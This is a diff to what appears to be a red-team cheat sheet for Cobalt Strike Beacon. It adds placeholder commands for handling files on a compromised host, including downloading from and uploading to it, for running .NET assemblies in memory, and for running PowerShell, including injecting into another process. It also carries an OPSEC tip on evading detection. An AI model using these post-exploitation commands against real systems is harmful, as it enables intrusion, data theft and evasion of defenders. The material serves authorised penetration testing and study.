@@ -306,12 +306,61 @@ beacon> sleep 5
 
 > **OPSEC Note**: Set a fast check-in can increase the chance of detection, it is also recommended to use a jitter which randomize the check-in time by a given percentage.
 
+## File Management
+
+There are some commands to interact with files.
+
+```powershell
+# List the file on the specified directory
+beacon > ls <C:\Path>
+
+# Change into the specified working directory
+beacon > cd [directory]
+
+# Delete a file\folder
+beacon > rm [file\folder]
+
+# File copy
+beacon > cp [src] [dest]
+
+# Download a file from the path on the Beacon host
+beacon > download [C:\filePath]
+
+# Lists downloads in progress
+beacon > downloads
+
+# Cancel a download currently in progress
+beacon > cancel [*file*]
+
+# Upload a file from the attacker to the current Beacon host
+beacon > upload [/path/to/file]
+```
+
+
 ## Execute Assembly
 
 The `execute-assembly` command allows the beacon to run `.NET` executables directly from memory.
 
 ```
-beacon> execute-assembly C:\Tools\Tool.exe
+beacon> execute-assembly [/path/script.exe]  [arguments]
+```
+
+## PowerShell Commands
+
+There are different ways to execute powershell commands on the beacon.
+
+```powershell
+# Import a Powershell .ps1 script from the control server and save it in memory in Beacon
+beacon > powershell-import [/path/to/script.ps1]
+
+# Setup a local TCP server bound to localhost and download the script imported from above using powershell.exe. Then the specified function and any arguments are executed and output is returned.
+beacon > powershell [commandlet][arguments]
+
+# Launch the given function using Unmanaged Powershell, which does not start powershell.exe. The program used is set by spawnto
+beacon > powerpick [commandlet] [argument]
+
+# Inject Unmanaged Powershell into a specific process and execute the specified command. This is useful for long-running Powershell jobs
+beacon > psinject [pid][arch] [commandlet] [arguments]
 ```
 
 # Hosting Files
